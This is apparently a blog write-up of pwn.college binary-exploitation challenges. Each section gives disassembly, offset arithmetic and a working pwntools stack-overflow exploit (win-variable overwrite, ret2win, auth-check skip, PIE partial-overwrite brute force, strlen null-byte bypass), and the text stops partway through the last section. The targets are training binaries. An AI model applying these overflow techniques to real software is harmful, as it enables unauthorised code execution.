-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">challenge</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> input[<span class="number">96</span>];</span><br><span class="line">        <span class="type">int</span> win_variable;</span><br><span class="line">    &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="type">int</span> received = read(<span class="number">0</span>, &amp;data.input, (<span class="type">unsigned</span> <span class="type">long</span>) size);</span><br><span class="line">    <span class="keyword">if</span> (data.win_variable) &#123; win(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>need input 96 bytes + 1 byte to overflow
-<code>win_variable</code>.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-first-overflow&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">96</span> + <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************}</p>
-<h1 id="precision-easy">Precision (easy)</h1>
-<p>Buffer 51 bytes, win variable 52 bytes after buffer. Lose variable 56
-bytes after buffer – must not overwrite it.</p>
-<p>Send exactly 53 bytes (52 padding + 1 to set win, stop before
-lose).</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-lose-variable-w&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">52</span> + <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************gzW}</p>
-<h1 id="precision-hard">Precision (hard)</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/binary-exploitation-lose-variable</span><br></pre></td></tr></table></figure>
-<p>Key parts of <code>sym.challenge</code>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">; buffer init: rep stosq with ecx=0xd (13), clearing 13*8=104 bytes</span><br><span class="line">0x004017a9      488d5580       lea rdx, [format]            ; buffer start</span><br><span class="line">0x004017b2      b90d000000     mov ecx, 0xd                 ; 13 iterations</span><br><span class="line">0x004017ba      f348ab         rep stosq qword [rdi], rax   ; memset(buf, 0, 104)</span><br><span class="line">; ...</span><br><span class="line">; read into buffer at [format]</span><br><span class="line">0x004017fe      488d4580       lea rax, [format]            ; buf = rbp - 0x80</span><br><span class="line">; ...</span><br><span class="line">; lose check</span><br><span class="line">0x0040184a      8b45e8         mov eax, dword [var_18h]     ; lose @ [rbp - 0x18]</span><br><span class="line">0x0040184d      85c0           test eax, eax</span><br><span class="line">; win check</span><br><span class="line">0x00401867      8b45e4         mov eax, dword [var_1ch]     ; win @ [rbp - 0x1c]</span><br><span class="line">0x0040186a      85c0           test eax, eax</span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>var_1ch</code> -&gt; <code>[rbp - 0x1c]</code>，<code>h</code>
-代表 Hex。</li>
-<li><code>var_18h</code> -&gt; <code>[rbp - 0x18]</code>。</li>
-</ul>
-<p><code>Win</code> 变量 <code>[rbp - 0x1c]</code>，<code>Lose</code>
-变量 <code>[rbp - 0x18]</code>。</p>
-<p>Buffer init 用 <code>rep stosq</code> 做
-<code>memset(buffer, 0, size)</code>：</p>
-<ul>
-<li><code>stosq</code>: 把 <code>rax</code> (0) 写入 <code>rdi</code>
-指向的地址，每次 8 bytes。</li>
-<li><code>rep</code> 配合 <code>ecx = 0xd</code> (13)，循环 13 次。</li>
-<li>13 * 8 = <strong>104 bytes</strong>。</li>
-</ul>
-<p>已知 <code>Lose</code> 变量位于 <code>[rbp - 0x18]</code>。Buffer
-起点位置 = <code>Lose</code> 变量往上推 104 字节。</p>
-<p><span class="math inline">0<em>x</em>18 + 104</span> (即 <span
-class="math inline">0<em>x</em>68</span>) = <strong><span
-class="math inline">0<em>x</em>80</span></strong></p>
-<p>Buffer 起点 <code>[rbp - 0x80]</code>，到 <code>[rbp - 0x1c]</code> =
-100 bytes，接下来 4 bytes 是 <code>Win</code> 变量。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-lose-variable&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">100</span> + <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************gzW}</p>
-<h1 id="variable-control-easy">Variable Control (easy)</h1>
-<p>Buffer 29 bytes, win variable 32 bytes after buffer (must set to
-<code>0x5a71653b</code>). Lose variable 36 bytes after buffer.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-var-control-w&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">32</span></span><br><span class="line">win_val = p32(<span class="number">0x5a71653b</span>)</span><br><span class="line">p.send(padding + win_val)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************W}</p>
-<h1 id="variable-control-hard">Variable Control (hard)</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge&quot;</span> /challenge/binary-exploitation-var-control</span><br></pre></td></tr></table></figure>
-<p>Key parts of <code>sym.challenge</code>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; buffer init: rep stosq with ecx=0xb (11), 11*8=88 bytes</span><br><span class="line">0x00402331      488d5590       lea rdx, [format]            ; buffer start</span><br><span class="line">0x0040233a      b90b000000     mov ecx, 0xb                 ; 11 iterations</span><br><span class="line">0x00402342      f348ab         rep stosq qword [rdi], rax   ; memset(buf, 0, 88)</span><br><span class="line">; ...</span><br><span class="line">; read into buffer at [format] = rbp - 0x70</span><br><span class="line">; ...</span><br><span class="line">; lose check @ [rbp - 0x18]</span><br><span class="line">0x004023c0      8b45e8         mov eax, dword [var_18h]</span><br><span class="line">; win check @ [rbp - 0x1c], must equal 0x16630978</span><br><span class="line">0x004023dd      8b45e4         mov eax, dword [var_1ch]</span><br><span class="line">0x004023e0      3d78096316     cmp eax, 0x16630978</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">88</span> + <span class="number">0x18</span>   <span class="comment"># buffer size + lose offset from end</span></span><br><span class="line"><span class="number">112</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">112</span> - <span class="number">0x1c</span>  <span class="comment"># distance to win variable</span></span><br><span class="line"><span class="number">84</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-var-control&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">84</span></span><br><span class="line">win_val = p32(<span class="number">0x16630978</span>)</span><br><span class="line">p.send(padding + win_val)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************W}</p>
-<h1 id="control-hijack-easy">Control Hijack (easy)</h1>
-<p>No win variable. Overflow return address to jump to
-<code>win()</code> at <code>0x401e1d</code>. Buffer starts 88 bytes
-before return address. Canary disabled, no PIE.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-control-hijack-w&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">59</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">29</span>  <span class="comment"># 88 bytes to reach return address</span></span><br><span class="line">win_val = p32(<span class="number">0x401e1d</span>)</span><br><span class="line">p.send(padding + win_val)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************}</p>
-<h1 id="control-hijack-hard">Control Hijack (hard)</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge; pdf @ sym.win&quot;</span> /challenge/binary-exploitation-control-hijack</span><br></pre></td></tr></table></figure>
-<p>Key parts of <code>sym.challenge</code>:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; buf -&gt; rbp - 0x60</span><br><span class="line">0x00401e5d      488d45a0       lea rax, [buf]</span><br><span class="line">0x00401e61      4889c6         mov rsi, rax        ; read into buf</span><br><span class="line">; ...</span><br><span class="line">0x00401eb4      c9             leave</span><br><span class="line">0x00401eb5      c3             ret</span><br></pre></td></tr></table></figure>
-<p><code>sym.win</code> 入口: <code>0x00401cb9</code></p>
-<p>在 x86_64 架构下，当一个函数被调用时，<strong>返回地址 (Return
-Address)</strong> 压入栈中。溢出覆盖返回地址为 <code>sym.win</code>，当
-<code>sym.challenge</code> 执行 <code>ret</code> 时 CPU 跳去执行 win
-函数。这叫 <strong>Ret2Win</strong>。</p>
-<ol type="1">
-<li><strong>输入缓冲区起点:</strong> <code>rbp - 0x60</code></li>
-</ol>
-<blockquote>
-<p>use <code>r2 -A</code> to analyze, default
-<code>asm.var = true</code>, visual mode shows variable names</p>
-</blockquote>
-<ol start="2" type="1">
-<li><strong>到达返回地址的距离:</strong>
-<ul>
-<li>覆盖局部变量: <strong>96 字节</strong> 到达 <code>rbp</code></li>
-<li>跨过 Saved RBP: <strong>8 字节</strong></li>
-<li>Padding = 96 + 8 = <strong>104 字节</strong></li>
-</ul></li>
-<li><strong>sym.win 入口:</strong> <code>0x00401cb9</code></li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-control-hijack&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">96</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">win_val = p32(<span class="number">0x401cb9</span>)</span><br><span class="line">p.send(padding + win_val)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************}</p>
-<h1 id="tricky-control-hijack-easy">Tricky Control Hijack (easy)</h1>
-<p><code>win_authed(int token)</code> requires
-<code>token == 0x1337</code>, but we can bypass the check by jumping
-past it.</p>
-<p>Buffer 31 bytes, return address 56 bytes after buffer. Canary
-disabled, no PIE.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.win_authed&quot;</span> /challenge/binary-exploitation-control-hijack-2-w</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x00402031      817dfc3713..   cmp dword [var_4h], 0x1337</span><br><span class="line">0x00402038      0f85fe000000   jne 0x40213c</span><br><span class="line">; jump past the check to here:</span><br><span class="line">0x0040203e      488d3dab10..   lea rdi, str.You_win__Here_is_your_flag:</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-control-hijack-2-w&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">31</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">25</span>  <span class="comment"># 56 bytes</span></span><br><span class="line">win_val = p32(<span class="number">0x0040203e</span>)</span><br><span class="line">p.send(padding + win_val)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************}</p>
-<h1 id="tricky-control-hijack-hard">Tricky Control Hijack (hard)</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge; pdf @ sym.win_authed&quot;</span> /challenge/binary-exploitation-control-hijack-2</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; sym.challenge: buf -&gt; rbp - 0x40</span><br><span class="line">0x0040157d      488d45c0       lea rax, [buf]</span><br><span class="line"></span><br><span class="line">; sym.win_authed: jump past auth check</span><br><span class="line">0x00401401      817dfc3713..   cmp dword [var_4h], 0x1337</span><br><span class="line">0x00401408      0f85fe000000   jne 0x40150c</span><br><span class="line">; ret to here:</span><br><span class="line">0x0040140e      488d3df30b..   lea rdi, str.You_win__Here_is_your_flag:</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;/challenge/binary-exploitation-control-hijack-2&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x40</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">win_val = p32(<span class="number">0x0040140e</span>)</span><br><span class="line">p.send(padding + win_val)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************}</p>
-<h1 id="pies-easy">PIEs (easy)</h1>
-<p>Position Independent Executable – Partial Overwrite</p>
-<h3 id="pie-与内存分页-memory-paging">1. PIE 与内存分页 (Memory
-Paging)</h3>
-<p>开启了 PIE，Kernel 会在每次执行时，把 binary
-塞到内存中一个完全随机的位置 (ASLR)。</p>
-<p>但 Kernel 按 <strong>Page (页)</strong> 管理内存：</p>
-<ul>
-<li>一个 Memory Page = <code>0x1000</code> bytes (4KB)</li>
-<li>基址 (Base Address) 永远是 <code>0x1000</code> 的倍数</li>
-<li><strong>最后三个 nibbles 永远是 <code>000</code></strong>（例如
-<code>0x5f7be1ec2000</code>）</li>
-</ul>
-<h3 id="偏移量-offset-不变">2. 偏移量 (Offset) 不变</h3>
-<p>虽然基址在变，但 <code>win()</code> 在 binary 内部的相对位置 (Offset)
-编译时就决定了。 假设 <code>win()</code> offset 为
-<code>0x1337</code>：</p>
-<ul>
-<li>基址 <code>0x5f7be1ec2000</code> -&gt; <code>win()</code> =
-<code>0x5f7be1ec3337</code></li>
-<li>基址 <code>0x6513a3b67000</code> -&gt; <code>win()</code> =
-<code>0x6513a3b68337</code></li>
-</ul>
-<p><strong>最后三个 nibbles (<code>337</code>) 不变。</strong></p>
-<h3 id="partial-overwrite-与-little-endian">3. Partial Overwrite 与
-Little-Endian</h3>
-<p>Little-Endian 下 Return Address
-最低有效字节在最低地址，溢出时从最低字节开始覆盖：</p>
-<ol type="1">
-<li><strong>改 1 字节 (2 nibbles):</strong> 不受 ASLR 影响，<strong>100%
-成功</strong>。</li>
-<li><strong>改 2 字节 (4 nibbles):</strong> 前 3 nibbles 固定，第 4
-nibble 随机。一个 nibble 16 种可能，每次 <span
-class="math inline">$\frac{1}{16}$</span> 概率。</li>
-</ol>
-<p>跑 <span class="math inline"><em>n</em></span> 次至少成功一次：</p>
-<p><span class="math display">$$P = 1 -
-\left(\frac{15}{16}\right)^n$$</span></p>
-<ul>
-<li>跑 11 次 <span class="math inline">≈</span> 50%</li>
-<li>跑 36 次 <span class="math inline">≈</span> 90%</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.win_authed&quot;</span> /challenge/binary-exploitation-pie-overflow-w</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; buf -&gt; rbp - 0x40, return address at rbp + 8, padding = 0x40 + 8 = 72 bytes</span><br><span class="line">; jump past auth check:</span><br><span class="line">0x00001a2b      488d3dbe16..   lea rdi, str.You_win__Here_is_your_flag:</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&quot;/challenge/binary-exploitation-pie-overflow-w&quot;</span></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * <span class="number">0x40</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> itertools.count():</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    payload = padding + p16(<span class="number">0x1A2B</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    output = p.clean(timeout=<span class="number">0.114514</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Try <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(output.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************}</p>
-<h1 id="pies-hard">PIEs (hard)</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge; pdf @ sym.win_authed&quot;</span> /challenge/binary-exploitation-pie-overflow</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">; sym.challenge: buf -&gt; rbp - 0x90</span><br><span class="line">0x00001ee3      488d8570ff..   lea rax, [buf]</span><br><span class="line"></span><br><span class="line">; sym.win_authed: jump past auth check</span><br><span class="line">0x00001cfb      817dfc3713..   cmp dword [var_4h], 0x1337</span><br><span class="line">0x00001d02      0f85fe000000   jne 0x1e06</span><br><span class="line">; ret to here -&gt; 0x1d08</span><br><span class="line">0x00001d08      488d3df912..   lea rdi, str.You_win__Here_is_your_flag:</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&quot;/challenge/binary-exploitation-pie-overflow&quot;</span></span><br><span class="line">padding = <span class="string">b&quot;A&quot;</span> * <span class="number">0x90</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> itertools.count():</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    payload = padding + p16(<span class="number">0x1d08</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    output = p.clean(timeout=<span class="number">0.114514</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Try <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(output.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************}</p>
-<h1 id="string-lengths-easy">String Lengths (easy)</h1>
-<p>Buffer 120 bytes, return address 168 bytes after buffer. PIE enabled,
-canary disabled.</p>
-<p>Challenge uses <code>strlen()</code> to validate input length before
-copying to stack. But <code>strlen()</code> stops at the first
-<code>\x00</code> (Null Byte).</p>
-<p>在 C 语言中，字符串以 <code>\x00</code> 结尾。<code>strlen()</code>
-碰到第一个 <code>\x00</code> 就停止计数。 在 payload 开头放一个
-<code>\x00</code>，<code>strlen()</code> 判定长度为
-<strong>0</strong>，绕过长度检查。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge; pdf @ sym.win_authed&quot;</span> /challenge/binary-exploitation-null-write-w</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; string_length &lt; 120 assertion</span><br><span class="line">0x00002b62      488d3d6d13..   lea rdi, str.string_length___120</span><br><span class="line"></span><br><span class="line">; win_authed: jump past auth check -&gt; 0x00002522</span><br><span class="line">0x00002515      817dfc3713..   cmp dword [var_4h], 0x1337</span><br><span class="line">0x0000251c      0f85fe000000   jne 0x2620</span><br><span class="line">0x00002522      488d3dc70b..   lea rdi, str.You_win__Here_is_your_flag:</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">binary_path = <span class="string">&quot;/challenge/binary-exploitation-null-write-w&quot;</span></span><br><span class="line">padding = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;A&quot;</span> * <span class="number">167</span>  <span class="comment"># 168 bytes total (null + 167 padding)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> itertools.count():</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    payload = padding + p16(<span class="number">0x2522</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    output = p.clean(timeout=<span class="number">0.114514</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;pwn.college&#123;&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Try <span class="subst">&#123;count&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(output.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
-<p>pwn.college{*******************************************}</p>
-<h1 id="string-lengths-hard">String Lengths (hard)</h1>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -A -q -c <span class="string">&quot;pdf @ sym.challenge; pdf @ sym.win_authed&quot;</span> /challenge/binary-exploitation-null-write</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">; sym.challenge:</span><br><span class="line">; malloc tmp buffer, read into it, strlen check, then memcpy to stack</span><br><span class="line">; buf on stack -&gt; s1 = rbp - 0xa0</span><br><span class="line">0x00001607      488d8560ff..   lea rax, [s1]</span><br><span class="line">; string_length &lt; 113 assertion (0x70 = 112, jbe means &lt;= 112)</span><br><span class="line">0x000015f1      488d3d7e0b..   lea rdi, str.string_length___113</span><br><span class="line"></span><br><span class="line">; win_authed: jump past auth -&gt; 0x000013ad</span><br><span class="line">0x000013a0      817dfc3713..   cmp dword [var_4h], 0x1337</span><br><span class="line">0x000013a7      0f85fe000000   jne 0x14ab</span><br><span 